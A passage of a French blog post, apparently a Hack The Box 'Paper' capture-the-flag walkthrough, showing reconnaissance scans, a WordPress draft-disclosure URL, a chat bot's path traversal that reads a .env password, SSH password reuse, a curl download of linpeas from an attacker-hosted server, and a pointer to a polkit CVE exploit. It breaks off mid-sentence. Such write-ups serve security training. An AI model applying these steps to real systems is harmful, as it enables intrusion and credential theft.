@@ -1,0 +1,324 @@
+<!doctype html><html lang=fr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>HTB - Paper sans MetaSploit - Masoopy</title><meta name=description content><meta property="og:title" content="HTB - Paper sans MetaSploit"><meta property="og:description" content="Intro Aujourd&rsquo;hui, nous allons nous attaquer à Paper, une box plutôt simple et aussi très fun. Si vous débutez dans le domaine, je vous recommande très fortement d&rsquo;essayer de vous creuser la tête avant de lire ce guide. Cette box est vraiment fun, et très sympa pour les débutants !
+Cible HTB - Paper
+Reconnaissance Petite reconnaissance basique en fonction des logos et autres infos :
+ Il s&rsquo;agit d&rsquo;un système Linux ; &mldr;  Et c&rsquo;est tout !"><meta property="og:type" content="article"><meta property="og:url" content="https://www.masoopy.com/fr/htb-paper-sans-metasploit/"><meta property="article:published_time" content="2022-03-12T00:00:00+00:00"><meta property="article:modified_time" content="2022-03-12T00:00:00+00:00"><meta property="og:site_name" content="Masoopy"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB - Paper sans MetaSploit"><meta name=twitter:description content="Intro Aujourd&rsquo;hui, nous allons nous attaquer à Paper, une box plutôt simple et aussi très fun. Si vous débutez dans le domaine, je vous recommande très fortement d&rsquo;essayer de vous creuser la tête avant de lire ce guide. Cette box est vraiment fun, et très sympa pour les débutants !
+Cible HTB - Paper
+Reconnaissance Petite reconnaissance basique en fonction des logos et autres infos :
+ Il s&rsquo;agit d&rsquo;un système Linux ; &mldr;  Et c&rsquo;est tout !"><meta name=application-name content="Masoopy"><meta name=apple-mobile-web-app-title content="Masoopy"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://www.masoopy.com/fr/htb-paper-sans-metasploit/><link rel=prev href=https://www.masoopy.com/fr/non-vous-navez-pas-besoin-dun-vpn/><link rel=next href=https://www.masoopy.com/fr/htb-backdoor-sans-metasploit/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB - Paper sans MetaSploit","inLanguage":"fr","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.masoopy.com\/fr\/htb-paper-sans-metasploit\/"},"genre":"posts","keywords":"HTB","wordcount":1883,"url":"https:\/\/www.masoopy.com\/fr\/htb-paper-sans-metasploit\/","datePublished":"2022-03-12T00:00:00+00:00","dateModified":"2022-03-12T00:00:00+00:00","publisher":{"@type":"Organization","name":"Denis G."},"author":{"@type":"Person","name":"Denis G."},"description":""}</script></head><body header-desktop header-mobile><script type=text/javascript>(''==='true'&&window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':(''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/fr/ title=Masoopy>Masoopy</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/fr/posts/>Articles </a><a class=menu-item href=/fr/tags/>Balises </a><a class=menu-item href=/fr/categories/>Catégories </a><a class=menu-item href=https://cheatsheets.masoopy.com/ rel="noopener noreferrer" target=_blank>Cheatsheets </a><a class=menu-item href=/fr/a-propos/>A propos </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item language" title="Choisir la langue">Français<i class="fas fa-chevron-right fa-fw"></i>
+<select class=language-select id=language-select-desktop onchange="location=this.value;"><option value=/fr/htb-paper-sans-metasploit/ selected>Français</option></select>
+</a><span class="menu-item search" id=search-desktop><input type=text placeholder="Rechercher des titres, des contenus..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Chercher><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clair><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span></span><a href=javascript:void(0); class="menu-item theme-switch" title="Changer de Thème"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/fr/ title=Masoopy>Masoopy</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Rechercher des titres, des contenus..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Chercher><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clair><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Annuler</a></div><a class=menu-item href=/fr/posts/>Articles</a><a class=menu-item href=/fr/tags/>Balises</a><a class=menu-item href=/fr/categories/>Catégories</a><a class=menu-item href=https://cheatsheets.masoopy.com/ rel="noopener noreferrer" target=_blank>Cheatsheets</a><a class=menu-item href=/fr/a-propos/>A propos</a><a href=javascript:void(0); class="menu-item theme-switch" title="Changer de Thème">
+<i class="fas fa-adjust fa-fw"></i></a><a href=javascript:void(0); class=menu-item title="Choisir la langue">Français<i class="fas fa-chevron-right fa-fw"></i>
+<select class=language-select onchange="location=this.value;"><option value=/fr/htb-paper-sans-metasploit/ selected>Français</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contenu</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">HTB - Paper sans MetaSploit</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/fr/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Denis G.</a></span>&nbsp;<span class=post-category>inclus dans <a href=/fr/categories/hacking/><i class="far fa-folder fa-fw"></i>hacking</a>&nbsp;<a href=/fr/categories/guides/><i class="far fa-folder fa-fw"></i>Guides</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-03-12>2022-03-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1883 mots&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;9 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Paper_Logo.png data-srcset="/images/2022/03/Paper_Logo.png, /images/2022/03/Paper_Logo.png 1.5x, /images/2022/03/Paper_Logo.png 2x" data-sizes=auto alt=/images/2022/03/Paper_Logo.png title=/images/2022/03/Paper_Logo.png></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contenu</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#cible>Cible</a></li><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#énumération>Énumération</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#obtenir-un-premier-shell>Obtenir un premier shell</a></li><li><a href=#privesc>PrivEsc</a></li></ul></li><li><a href=#outro>Outro</a></li></ul></nav></div></div><div class=content id=content><h2 id=intro>Intro</h2><p>Aujourd&rsquo;hui, nous allons nous attaquer à Paper, une box plutôt simple et aussi très fun. Si vous débutez dans le domaine, je vous recommande très fortement d&rsquo;essayer de vous creuser la tête avant de lire ce guide. Cette box est vraiment fun, et très sympa pour les débutants !</p><h2 id=cible>Cible</h2><p><a href=https://app.hackthebox.com/machines/Paper target=_blank rel="noopener noreferrer">HTB - Paper</a></p><h2 id=reconnaissance>Reconnaissance</h2><p>Petite reconnaissance basique en fonction des logos et autres infos :</p><ul><li>Il s&rsquo;agit d&rsquo;un système Linux ;</li><li>&mldr;</li></ul><p>Et c&rsquo;est tout !</p><h2 id=énumération>Énumération</h2><p>Lançons notre scan <code>nmap</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>sudo nmap -sC -sV -oA scans\$IP_CIBLE
+</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 15:39 CET
+Nmap scan report for $IP_CIBLE
+Host is up (0.037s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: HTTP Server Test Page powered by CentOS
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-title: HTTP Server Test Page powered by CentOS
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+</code></pre></td></tr></table></div></div><p>Nous pouvons voir les services classiques pour une box Linux : SSH et un serveur Apache qui tourne sur les ports 80/tcp et 443/tcp (pour le HTTPs).</p><p>Sachant qu&rsquo;il s&rsquo;agit d&rsquo;un serveur web, j&rsquo;aime bien lancer <code>Gobuster</code> pour essayer de trouver des chemins cachés :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>gobuster dir -u http://$IP_CIBLE -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -o scans/gobuster
+</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://$IP_CIBLE
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/03/02 15:42:41 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 199]
+/.htpasswd            (Status: 403) [Size: 199]
+/.htaccess            (Status: 403) [Size: 199]
+/cgi-bin/             (Status: 403) [Size: 199]
+/manual               (Status: 301) [Size: 236] [--&gt; http://$IP_CIBLE/manual/]
+                                                                                  
+===============================================================
+2022/03/02 15:42:52 Finished
+===============================================================
+</code></pre></td></tr></table></div></div><p>Ce scan ne nous révèle pas grand chose&mldr; Nous allons donc lancer <code>Nikto</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>nikto -h http://$IP_CIBLE
+</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          $IP_CIBLE
++ Target Hostname:    $IP_CIBLE
++ Target Port:        80
++ Start Time:         2022-03-02 15:46:14 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header &#39;x-backend-server&#39; found, with contents: office.paper
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/7.2.24
++ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8724 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2022-03-02 15:49:53 (GMT1) (219 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre></td></tr></table></div></div><p>A première vue, nous pourrions penser qu&rsquo;il n&rsquo;y a rien d&rsquo;intéressant ici non plus. Pour être honnête, je suis totalement passé à côté pendant un certain temps&mldr;</p><p>Finalement, il y a la ligne suivante : <code>Uncommon header 'x-backend-server' found, with contents: office.paper</code>.</p><p>En voyant, cela, j&rsquo;ai donc décidé de rajouter une entrée dans le fichier <code>/etc/hosts</code> faisant pointer l&rsquo;IP de la box vers le nom d&rsquo;hôte <code>office.paper</code>.</p><p>Une fois cela fait, en se rendant sur l&rsquo;URL : <code>http://office.paper</code>, nous découvrons un nouveau site tournant sous <code>Wordpress</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Paper_WP.png data-srcset="/images/2022/03/Paper_WP.png, /images/2022/03/Paper_WP.png 1.5x, /images/2022/03/Paper_WP.png 2x" data-sizes=auto alt=/images/2022/03/Paper_WP.png title="Wordpress caché"></p><p>Qui dit Wordpress, dit WPScan, c&rsquo;est parti :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>wpscan --url http://office/paper
+</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>         __          _______   _____                                                                                                                                                                              
+         \ \        / /  __ \ / ____|                                                                                                                                                                             
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                                            
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \                                                                                                                                                             
+            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                                            
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                                            
+                                                                                                                                                                                                                  
+         WordPress Security Scanner by the WPScan Team                                                                                                                                                            
+                         Version 3.8.17                                                                                                                                                                           
+       Sponsored by Automattic - https://automattic.com/                                                                                                                                                          
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                                                            
+_______________________________________________________________                                                                                                                                                   
+                                                                                                                                                                                                                  
+[i] It seems like you have not updated the database for some time.                                                                                                                                                
+[?] Do you want to update now? [Y]es [N]o, default: [N]Y                                                                                                                                                          
+[i] Updating the Database ...                                                                                                                                                                                     
+[i] Update completed.                                                                                                                                                                                             
+                                                                                                                                                                                                                  
+[+] URL: http://office.paper/ [$IP_CIBLE]                                                                                                                                                                     
+[+] Started: Thu Mar  3 14:20:45 2022                                                                                                                                                                             
+                                                                                                                                                                                                                  
+Interesting Finding(s):                                                                                                                                                                                           
+                                                                                                                                                                                                                  
+[+] Headers                                                                                                                                                                                                        | Interesting Entries:                                                                                                                                                                                          
+ |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9                                      
+ |  - X-Powered-By: PHP/7.2.24                                                                           
+ |  - X-Backend-Server: office.paper                                                                     
+ | Found By: Headers (Passive Detection)                                                                 
+ | Confidence: 100%                                                                                      
+                                                                                                                                                                                                                 
+[+] WordPress readme found: http://office.paper/readme.html                                              
+ | Found By: Direct Access (Aggressive Detection)                                                        
+ | Confidence: 100%                                                                                                                                                                                               
+                                                                                                         
+[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).                               
+ | Found By: Rss Generator (Passive Detection)                                                                                                                                                                   
+ |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;                                                                                                                 
+ |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;                                                                                                        
+                                                    
+[+] WordPress theme in use: construction-techup                                                                                                                                                                  
+ | Location: http://office.paper/wp-content/themes/construction-techup/                                  
+ | Last Updated: 2021-07-17T00:00:00.000Z                                                                                                                                                                        
+ | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt                                                                                                                                  
+ | [!] The version is out of date, the latest version is 1.4                                                                                                                                                     
+ | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1                
+ | Style Name: Construction Techup                                                                                                                                                                               
+ | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...                                                                                          
+ | Author: wptexture                
+ | Author URI: https://testerwp.com/                                                                     
+ |                                                                                                                                                                                                               
+ | Found By: Css Style In Homepage (Passive Detection)          
+  |                                                                                                       
+ | Version: 1.1 (80% confidence)                                                                         
+ | Found By: Style (Passive Detection)                                                                   
+ |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: &#39;Version: 1.1&#39; 
+                                                                                                                                                                                                                 
+[+] Enumerating All Plugins (via Passive Methods)                                                        
+                                                                                                         
+[i] No plugins Found.                                                                                                                                                                                             
+                                                                                                         
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)                                      
+ Checking Config Backups - Time: 00:00:00 &lt;===================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00
+                                                                                                                                                                                                                 
+[i] No Config Backups Found.                                                                                                                                                                                      
+                                                    
+[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                                                                               
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register    
+                                                                                                                                                                                                                 
+[+] Finished: Thu Mar  3 14:20:50 2022                                                                                                                                                                           
+[+] Requests Done: 180                                                                                                                                                                                           
+[+] Cached Requests: 5                                                                                   
+[+] Data Sent: 43.575 KB                                                                                                                                                                                         
+[+] Data Received: 17.864 MB                                                                                                                                                                                      
+[+] Memory used: 229.191 MB         
+[+] Elapsed time: 00:00:04
+</code></pre></td></tr></table></div></div><p>Il s&rsquo;agit d&rsquo;un vieux <code>Wordpress</code>, version 5.2.3 ! Un tour rapide sur <a href=https://www.exploit-db.com/exploits/47690 target=_blank rel="noopener noreferrer">exploit-db</a> nous apprend qu&rsquo;il est vulnérable. La faille en question permet d&rsquo;accéder aux brouillons et autre contenu non publié&mldr; Sur le Wordpress que nous venons de découvrir, il y a justement des commentaires laissant penser que l&rsquo;admin du site à noté des infos dans les brouillons&mldr;</p><h2 id=exploitation>Exploitation</h2><p>L&rsquo;exploit recommande d&rsquo;utiliser l&rsquo;URL suivante :</p><p><code>http://office.paper/?static=1&order=asc</code></p><p>Cela ne fonctionne pas&mldr;</p><p>Essayons donc, simplement de changer l&rsquo;URL en remplaçant le dernier mot clef par son contraire :</p><p><code>http://office.paper/?static=1&order=desc</code></p><p>Bingo, cela fonctionne :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Paper_Drafts.png data-srcset="/images/2022/03/Paper_Drafts.png, /images/2022/03/Paper_Drafts.png 1.5x, /images/2022/03/Paper_Drafts.png 2x" data-sizes=auto alt=/images/2022/03/Paper_Drafts.png title="Paper Wordpress brouillons"></p><p>Nous découvrons une nouvelle URL &ldquo;secrète&rdquo;, avec un nouveau nom de domaine : <code>chat.office.paper</code>. Nous le rajoutons donc dans notre fichier <code>/etc/hosts</code> afin de pouvoir y accéder.</p><p>Une fois cela fait, nous naviguons vers cette URL et nous découvrons, un chat, <code>Rocket Chat</code>. Il est possible de créer un compte, faisons le !</p><p>Une fois le compte créé, nous avons accès au chat et à l&rsquo;historique des messages. Après un peu de lecture, nous découvrons qu&rsquo;il existe un bot capable de lister et obtenir des documents et fichiers. Allons lui parler !</p><p>Nous remarquons rapidement qu&rsquo;il est assez simple de naviguer dans les fichiers avec la commande <code>recyclops list</code>, et surtout, nous pouvons sortir du dossier actuel avec <code>recyclops list ../</code>. Ce qui liste le contenu de la <code>home</code> de l&rsquo;utilisateur. Au passage, nous voyons aussi son nom : <code>Dwight</code>. Malheureusement, impossible d&rsquo;obtenir le <code>user.txt</code>, ni des fichiers systèmes intéressants.</p><p>Cependant, le dossier <code>/home/dwight</code> contient un script <code>bot_restart.sh</code> qui pointe lui-même vers un autre script dans lequel est appelé un fichier <code>.env</code>. Grâce à la commande : <code>recyclops file ../hubot/.env</code> nous pouvons lire le contenu de ce fichier qui contient un mot de passe !!</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Paper_Creds.png data-srcset="/images/2022/03/Paper_Creds.png, /images/2022/03/Paper_Creds.png 1.5x, /images/2022/03/Paper_Creds.png 2x" data-sizes=auto alt=/images/2022/03/Paper_Creds.png title="Paper Rocket Creds"></p><p>L&rsquo;utilisateur n&rsquo;est pas présent sur le système, il s&rsquo;agit probablement de l&rsquo;admin du chat. Essayons tout de même le MDP trouvé avec l&rsquo;utilisateur <code>dwight</code> via <code>SSH</code>.</p><h3 id=obtenir-un-premier-shell>Obtenir un premier shell</h3><p>Bingo ! Un bon gros cas de réutilisation de mot de passe ! <code>Dwight</code> et <code>Recyclops</code> partagent le même MDP. Nous sommes donc sur le machine, en <code>SSH</code> ! C&rsquo;est à dire un super shell, bien stable et facile à relancer en cas de besoin.</p><p>Obtenir le <code>flag user</code> est donc un jeu d&rsquo;enfant, via la commande <code>cat</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Paper_User_Flag.png data-srcset="/images/2022/03/Paper_User_Flag.png, /images/2022/03/Paper_User_Flag.png 1.5x, /images/2022/03/Paper_User_Flag.png 2x" data-sizes=auto alt=/images/2022/03/Paper_User_Flag.png title="Paper User Flag"></p><h3 id=privesc>PrivEsc</h3><p>Désormais, le <code>PrivEsc</code> ! Nous avons un accès utilisateur, mais nous allons chercher à augmenter nos droits afin de devenir <code>root</code> et ainsi avoir le contrôle total de la machine.</p><p>Pour ce faire, j&rsquo;aime lancer un scan via <a href=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS target=_blank rel="noopener noreferrer">LinPeas</a> (WinPeas sous Windows).</p><p>Sur toutes les machines <code>HTB</code>, l&rsquo;accès vers internet et coupé. Il faut donc télécharger la dernière version du script sur notre machine &ldquo;attaquante&rdquo; et ensuite l&rsquo;envoyer depuis notre machine vers notre cible. Puisque nous avons un accès <code>SSH</code>, nous pouvons simplement l&rsquo;envoyer via <code>SCP</code>, mais je préfère une méthode plus universelle via un module <code>Python</code>.</p><p>Je vais donc vous montrer comment procéder :</p><ol><li>Sur notre machine qui &ldquo;attaque&rdquo;, il faut se placer dans le dossier contenant le script <code>linpeas.sh</code> puis lancer la commande suivante : <code>python3 -m http.server</code>.</li><li>Sur la &ldquo;cible&rdquo;, il faut récupérer le script : <code>curl -O http://$IP_ATTAQUANT:8000/linpeas.sh</code>.</li></ol><p>Une fois le script téléchargé, nous l&rsquo;éxécutons. Rapidement, Linpeas détecte une vulnérabilité du côté de <code>sudo</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Paper_Sudo_CVE.png data-srcset="/images/2022/03/Paper_Sudo_CVE.png, /images/2022/03/Paper_Sudo_CVE.png 1.5x, /images/2022/03/Paper_Sudo_CVE.png 2x" data-sizes=auto alt=/images/2022/03/Paper_Sudo_CVE.png title="Paper Linpeas"></p><p>Une recherche rapide sur <a href="https://duckduckgo.com/?q=CVE-2021-3560+exploit+github&t=ffab&ia=web" target=_blank rel="noopener noreferrer">DDG</a>, nous amène vers un <a href=https://github.com/Almorabea/Polkit-exploit target=_blank rel="noopener noreferrer">dépôt Github prometteur</a>.</p><p>Même procédure que pour le script <code>linpeas.sh</code>, nous allons récupérer le fichier <code>CVE-2021-3560.py</code> sur notre cible et l&rsquo;exécuter.</p><p><strong>NB : avant d&rsquo;exécuter un script, quelque il soit, il est toujours très important de le lire et d&rsquo;essayer de le comprendre ! Vous ne voulez surtout pas exécuter un script qui compromettrait votre machine.</strong></p><p>Après quelques secondes, le script nous donne un 